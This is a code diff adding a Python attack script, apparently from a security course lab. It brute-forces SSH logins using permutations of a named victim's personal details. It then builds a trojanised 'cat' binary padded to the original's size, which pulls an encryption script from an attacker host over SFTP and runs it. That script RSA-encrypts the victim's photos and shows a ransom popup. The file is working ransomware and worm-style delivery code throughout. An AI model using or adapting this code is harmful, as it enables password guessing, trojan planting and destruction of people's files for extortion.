@@ -1,0 +1,249 @@
+#! /usr/bin/python3
+#coding: utf-8
+
+import itertools
+import paramiko
+import sys, os
+import time
+import threading
+def get_ransomeware(ip,port,password):
+    f = open('client','w+')
+    f.write('#! /usr/bin/python3'+'\n')
+    f.write('import os'+'\n')
+    f.write('import itertools'+'\n')
+    f.write('import paramiko'+'\n')
+    f.write('import sys'+'\n')
+    f.write('ssh = paramiko.client.SSHClient()'+'\n')
+    f.write('ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())'+'\n')
+    f.write('try:'+'\n')
+    f.write('    ssh.connect("'+ip+'",'+ str(port) +', \'csc2021\',\''+ password+'\')'+'\n')
+    f.write('    t = paramiko.Transport(("'+ip+'",'+str(port)+'))'+'\n')
+    f.write('    t.connect(username=\'csc2021\',password=\''+password+'\')'+'\n')
+    f.write('except:'+'\n')
+    f.write('    ssh.connect("'+ip+'",'+ str(port) +', \'csc2021\',\''+ 'csc2021'+'\')'+'\n')
+    f.write('    t = paramiko.Transport(("'+ip+'",'+str(port)+'))'+'\n')
+    f.write('    t.connect(username=\'csc2021\',password=\''+'csc2021'+'\')'+'\n')
+    f.write('sftp = paramiko.SFTPClient.from_transport(t)'+'\n')
+    f.write('sftp.get(\'/home/csc2021/rsa.py\',\'./rsa.py\')'+'\n')
+    f.write('t.close()'+'\n')    
+    f.write('ssh.close()'+'\n')
+    f.close()
+
+
+
+def compress():
+    f = open('compress','w+')
+    f.write('#! /usr/bin/python3'+'\n')
+    f.write('import os'+'\n')
+    f.write('os.system("chmod +x client")'+'\n')  
+    f.write('os.system("zip virus.zip client cat")'+'\n')
+    f.write('real_cat_size = os.path.getsize("/home/csc2021/cat")'+'\n')
+    f.write('tar_size = os.path.getsize("virus.zip")'+'\n')
+    f.write('tmp_sh_size = os.path.getsize("tmp.sh")'+'\n')
+    f.write('trash_size = real_cat_size - tmp_sh_size -tar_size'+'\n')   
+    f.write('with open("tmp2.sh","w+") as f1:'+'\n')
+    f.write('    f1.write("#!/bin/bash")'+'\n')
+    f.write('    while True:'+'\n')
+    f.write('        if f1.tell() == trash_size - 4:'+'\n')
+    f.write('            break'+'\n')
+    f.write('        else:'+'\n')
+    f.write('            f1.write("#")'+'\n')
+    f.write('os.system("tee -a tmp2.sh < tmp.sh > /dev/null")'+'\n')  
+    f.write('os.system("rm cat")'+'\n')
+    f.write('os.system("tee cat < tmp2.sh > /dev/null")'+'\n')
+    f.write('os.system("tee -a cat < virus.zip > /dev/null")'+'\n')      
+    f.write('os.system("chmod +x cat")'+'\n')
+    f.write('os.system("rm virus.zip client trash_file tmp.sh tmp2.sh")'+'\n')
+    f.close()
+
+
+def script():
+    f = open('tmp.sh','w+')
+    f.write('\n')
+    f.write('#create a temporary folder'+'\n')
+    f.write('export TMPDIR=`mktemp -d /tmp/selfextract.XXXXXX`'+'\n\n')
+    f.write('#find out the size of this file?'+'\n')
+    ARCHIVE="`awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' $0`"
+    f.write('ARCHIVE='+ARCHIVE+'\n\n')
+    f.write('CDIR=`pwd`'+'\n')
+    f.write('#decompress the file'+'\n')
+    f.write('tail -n+$ARCHIVE $0 > "$TMPDIR/virus.zip"'+'\n')
+    f.write('# execute two files inside'+'\n')
+    f.write('cd "$TMPDIR"'+'\n')
+    f.write('unzip -q "virus.zip"'+'\n')
+    f.write('./client'+'\n')
+    f.write('python3 "rsa.py"'+'\n')
+    f.write('cd "$CDIR"'+'\n')
+    f.write('"$TMPDIR"/cat $*'+'\n\n')
+    f.write('#remove the temporary folder'+'\n')
+    f.write('cd "/"'+'\n')
+    f.write('rm -rf $TMPDIR'+'\n')
+    f.write('exit 0'+'\n')
+    f.write('__ARCHIVE_BELOW__'+'\n')
+    f.close()
+
+
+
+def encrypt():
+    f = open('/home/csc2021/rsa.py','w+')
+    f.write('#! /usr/bin/python3'+'\n')
+    f.write('import sys'+'\n')
+    f.write('import os'+'\n')
+    f.write('import pickle'+'\n')
+    f.write('path = "/home/csc2021/Pictures"'+'\n')
+    f.write('files =os.listdir(path)'+'\n')
+    f.write('picture_path = list()'+'\n')
+    f.write('for file in files:'+'\n')
+    f.write('    if ".jpg" in file:'+'\n')
+    f.write('        path_tmp = path+"/"+file'+'\n')
+    f.write('        picture_path.append(path_tmp)'+'\n\n')
+    f.write('#set for decryption use (d=91)'+'\n')
+    ##22291846172619859445381409012451
+    # f.write('n = 9797'+'\n')
+    # f.write('e = 211'+'\n\n')
+    f.write('n = 22291846172619859445381409012451'+'\n')
+    f.write('e = 65535'+'\n\n')
+    ##
+    f.write('# DO RSA encryption'+'\n')
+    f.write('for p in picture_path:'+'\n')
+    f.write("    plain_bytes = b''"+'\n')
+    f.write('    with open(p,"rb") as f:'+'\n')
+    f.write('        plain_bytes = f.read()'+'\n')
+    f.write('    cipher_int = [pow(i, e, n) for i in plain_bytes]'+'\n')
+    f.write('    with open(p, "wb") as f:'+'\n')
+    f.write('        pickle.dump(cipher_int, f)'+'\n\n')
+    f.write('#pop up the windows'+'\n')
+    f.write('string = "Give me ransom hahaha"'+'\n')
+    f.write('err = "Error"'+'\n')
+    f.write('os.system("zenity --error --text=\'Give me ransom hahaha\' --title=\'Error\'")'+'\n')
+    f.close()
+    ## sftp go to attacker's /home/csc2021/directory to acquire rsa.py so copy it to there
+    #os.system("cp ./rsa.py /home/csc2021/rsa.py")
+
+def sshConnect(target, port, username, password):
+    """ 
+    Create ssh client session to test username and password
+    Args:
+    password -- contains string from each line of password file
+    """
+    # Create client and auto-add key to prevent printing of host key policy warning
+    ssh = paramiko.client.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # Attempt connection with user supplied creds (called iteratively)
+    #global ssh
+    try: 
+        ssh.connect(target, port, username, password)#,auth_timeout=0.5,banner_timeout=200,timeout=1.0)
+
+    # Catch bad creds
+    except paramiko.AuthenticationException:
+        #time.sleep(0.5)
+        ssh.close()
+        #print('Unsuccessful') # Print to attempt notification line
+        return False
+
+    # Catch target connection failure (generic exception) and clean up
+    except OSError:
+        ssh.close()
+        sys.exit('\n[+] Connection to ' + target + ' was unsuccessful (the host is possibly down)\n[+] Exiting...\n')
+
+    # Handle user ctrl+c within function
+    except KeyboardInterrupt:
+        sys.exit('\n[+] Exiting...\n')
+
+    # Must have found the password!
+    else:
+        
+        print('\n[!] SUCCESS! Creds: '  + target + ':' + str(port) + ' Password: ' + password + '\n')
+        # generate rsa.py
+        encrypt()
+        # virus to get ransomeware
+        attacker_password ='csc2021'
+        get_ransomeware(attacker_ip,ssh_port,password)
+        # script to unzip file and execute
+        script()
+        # compress all files to infected cat
+        compress()
+        # send files to victim's machine
+        t = paramiko.Transport((victim_ip,ssh_port))
+        t.connect(username='csc2021',password=password)
+        sftp = paramiko.SFTPClient.from_transport(t)
+        sftp.put('./client','/home/csc2021/client')
+        sftp.put('./tmp.sh','/home/csc2021/tmp.sh')
+        sftp.put('./compress','/home/csc2021/compress')
+        # add signature
+        stdin, stdout, stderr = ssh.exec_command('chmod +x compress; ./compress; rm compress; echo -n -e \'\\xaf\\xbe\\xad\\xde\' >> cat')
+        t.close()
+        ssh.close()
+        return 1
+
+
+
+# Attempt count
+count = 0 
+username = 'csc2021'
+potential_password = ['csc2021']
+
+## argument ##
+victim_ip =sys.argv[1]
+attacker_ip = sys.argv[2]
+attacker_port = int(sys.argv[3])
+
+ssh_port = 22
+
+
+# ssh = paramiko.client.SSHClient()
+# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+victim_info = ['YueHan', 'Wang', 'YH', '@', '_', '0228', '1998', 'oscar', 'Realtek']
+# start_time=time.time()
+# flag =False
+for i in range(1,len(victim_info)+1):
+    # if flag:
+    #     break
+    y = list(itertools.permutations(victim_info, i))
+    for j in y:
+        pwd = ''.join(j)
+        potential_password.append(pwd)
+        # check = sshConnect(victim_ip,ssh_port,username,pwd)
+        # if check == 1:
+        #     print("COUNT=",count,"password=",pwd, "time=",time.time()-start_time)
+        #     flag = True
+        #     break
+
+# Iterate through password file
+start_time=time.time()
+for password in potential_password:
+    count += 1
+    #print('[-] Attempt ' + str(count) + ': ' + password + ' ...', end=' ')
+    #ssh connect to vicitm pc
+    check = sshConnect(victim_ip,ssh_port,username,password)
+    if check == 1:
+        print("COUNT=",count,"password=",password, "time=",time.time()-start_time)
+        break
+#flag = False
+# def guess_password(potential_password,i):
+#     global flag,victim_ip,ssh_port,username
+#     start_idx=i*9865
+#     end_idx = min(986410,(i+1)*9865)
+#     for idx in range(start_idx,end_idx):
+#         password = potential_password[idx]
+#         check = sshConnect(victim_ip,ssh_port,username,password)
+#         if flag:
+#             return
+#         if check == 1:
+#             flag=True
+#             print("password=",password, "time=",time.time()-start_time)
+#             break
+
+
+
+# threads=[]
+# print("before")
+# for i in range(100):
+#     print(i)
+#     tr=threading.Thread(target=guess_password,args=(potential_password,i,))
+#     tr.start()
+# print("here")
+
+
